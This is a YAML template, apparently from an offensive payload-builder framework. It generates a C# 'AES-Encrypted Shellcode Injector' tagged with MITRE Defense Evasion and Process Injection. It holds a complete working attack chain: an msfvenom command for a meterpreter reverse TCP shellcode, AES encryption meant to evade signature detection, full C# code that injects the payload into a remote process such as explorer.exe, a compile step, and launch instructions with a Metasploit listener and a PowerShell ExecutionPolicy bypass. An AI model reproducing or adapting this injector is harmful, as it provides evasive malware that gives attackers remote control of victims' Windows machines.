versions:
  - version: 1
    comment: "Initial version"
    timestamp: "2026-02-17T00:00:00"
    original:
      meta:
        name: "C# AES-Encrypted Shellcode Injector"
        category: "Process Injection"
        description: |
          Injects AES-256-CBC encrypted shellcode into a remote process using C#.
          Uses strong encryption to evade static analysis and signature detection.
          Targets Windows x64 systems.

          The shellcode is encrypted with AES-256-CBC, and the decryption
          happens at runtime in memory. Key and IV are auto-generated.

        effectiveness: "high"

        mitre:
          tactic: "TA0005 - Defense Evasion"
          technique: "T1055 - Process Injection"

        artifacts:
          - "Process creation with PROCESS_ALL_ACCESS"
          - "VirtualAllocEx and WriteProcessMemory API calls"
          - "CreateRemoteThread execution"
          - "AES-encrypted shellcode in memory"
          - "System.Security.Cryptography namespace usage"

      parameters:
        - name: "target_process"
          type: "string"
          description: "Target process name (e.g., explorer.exe, notepad.exe)"
          required: true
          default: "explorer.exe"

        - name: "lhost"
          type: "ip"
          description: "Listener IP address for reverse shell"
          required: true

        - name: "lport"
          type: "port"
          description: "Listener port for reverse shell"
          required: true
          default: 4444

        - name: "output_file"
          type: "string"
          description: "Output executable filename"
          required: true
          default: "injector.exe"

        - name: "output_path"
          type: "path"
          description: "Output directory for compiled executable"
          required: true
          default: "{config.output_dir}"

      preprocessing:
        - type: "command"
          name: "generate_shellcode"
          command: |
            msfvenom -p windows/x64/meterpreter_reverse_tcp \
              LHOST={{ lhost }} LPORT={{ lport }} \
              EXITFUNC=thread -f raw
          output_var: "raw_shellcode"

        - type: "script"
          name: "base64_encode_shellcode"
          script: "base64_encode.py"
          args:
            data: "{{ raw_shellcode }}"
            format: "string"
          output_var: "shellcode_b64"

        - type: "script"
          name: "aes_encryption"
          script: "aes_encrypt.py"
          args:
            data: "{{ shellcode_b64 }}"
            key: "auto"
            iv: "auto"
          output_var: "aes_result"

        - type: "script"
          name: "format_encrypted_payload"
          script: "format_csharp.py"
          args:
            data: "{{ aes_result.encrypted }}"
            var_name: "encryptedShellcode"
            bytes_per_line: 15
          output_var: "csharp_shellcode"

        - type: "script"
          name: "format_aes_key"
          script: "format_csharp.py"
          args:
            data: "{{ aes_result.key }}"
            var_name: "aesKey"
            bytes_per_line: 16
          output_var: "csharp_key"

        - type: "script"
          name: "format_aes_iv"
          script: "format_csharp.py"
          args:
            data: "{{ aes_result.iv }}"
            var_name: "aesIV"
            bytes_per_line: 16
          output_var: "csharp_iv"

      output:
        type: "template"
        template_ext: ".cs"
        template: |
          using System;
          using System.Runtime.InteropServices;
          using System.Security.Cryptography;
          using System.Diagnostics;

          namespace AESInjector
          {
              public class Program
              {
                  // P/Invoke declarations
                  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                  static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

                  [DllImport("kernel32.dll", SetLastError = true)]
                  static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

                  [DllImport("kernel32.dll")]
                  static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

                  [DllImport("kernel32.dll", SetLastError = true)]
                  static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

                  const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
                  const uint MEM_COMMIT = 0x00001000;
                  const uint MEM_RESERVE = 0x00002000;
                  const uint PAGE_EXECUTE_READWRITE = 0x40;

                  public static void Main(string[] args)
                  {
                      if (args.Length == 0)
                      {
                          Console.WriteLine("Usage: AESInjector.exe <process_name>");
                          Console.WriteLine("Example: AESInjector.exe explorer.exe");
                          return;
                      }

                      string targetProcess = args[0];

                      // AES-256 key (auto-generated during payload build)
                      {{ csharp_key | indent(12) }}

                      // AES IV (auto-generated during payload build)
                      {{ csharp_iv | indent(12) }}

                      // Encrypted shellcode (AES-256-CBC encrypted msfvenom payload)
                      {{ csharp_shellcode | indent(12) }}

                      // Decrypt the shellcode
                      byte[] decryptedShellcode = DecryptAES(encryptedShellcode, aesKey, aesIV);

                      Console.WriteLine($"[*] Decrypted shellcode size: {decryptedShellcode.Length} bytes");

                      // Find target process
                      Process[] processes = Process.GetProcessesByName(targetProcess.Replace(".exe", ""));
                      if (processes.Length == 0)
                      {
                          Console.WriteLine($"[-] Process '{targetProcess}' not found!");
                          return;
                      }

                      int pid = processes[0].Id;
                      Console.WriteLine($"[+] Found {targetProcess} with PID: {pid}");

                      // Open process
                      IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                      if (hProcess == IntPtr.Zero)
                      {
                          Console.WriteLine("[-] Failed to open process!");
                          return;
                      }
                      Console.WriteLine("[+] Process opened successfully");

                      // Allocate memory in target process
                      IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                      if (addr == IntPtr.Zero)
                      {
                          Console.WriteLine("[-] Failed to allocate memory!");
                          return;
                      }
                      Console.WriteLine($"[+] Allocated memory at: 0x{addr.ToInt64():X}");

                      // Write shellcode to target process
                      UIntPtr bytesWritten;
                      if (!WriteProcessMemory(hProcess, addr, decryptedShellcode, (uint)decryptedShellcode.Length, out bytesWritten))
                      {
                          Console.WriteLine("[-] Failed to write shellcode!");
                          return;
                      }
                      Console.WriteLine($"[+] Wrote {bytesWritten} bytes to target process");

                      // Create remote thread to execute shellcode
                      IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                      if (hThread == IntPtr.Zero)
                      {
                          Console.WriteLine("[-] Failed to create remote thread!");
                          return;
                      }

                      Console.WriteLine("[+] Remote thread created successfully!");
                      Console.WriteLine("[+] Shellcode injected and executing...");
                  }

                  static byte[] DecryptAES(byte[] encryptedData, byte[] key, byte[] iv)
                  {
                      using (Aes aes = Aes.Create())
                      {
                          aes.Key = key;
                          aes.IV = iv;
                          aes.Mode = CipherMode.CBC;
                          aes.Padding = PaddingMode.PKCS7;

                          ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                          using (System.IO.MemoryStream msDecrypt = new System.IO.MemoryStream(encryptedData))
                          {
                              using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                              {
                                  using (System.IO.MemoryStream msPlain = new System.IO.MemoryStream())
                                  {
                                      csDecrypt.CopyTo(msPlain);
                                      return msPlain.ToArray();
                                  }
                              }
                          }
                      }
                  }
              }
          }

        compile:
          enabled: true
          command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"

        launch_instructions: |
          # Step 1: Start Metasploit listener
          msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; exploit"

          # Step 2: Execute on target Windows system
          {{ output_file }} {{ target_process }}

          # Alternative: Execute with PowerShell
          powershell -ExecutionPolicy Bypass -File {{ output_file }} {{ target_process }}
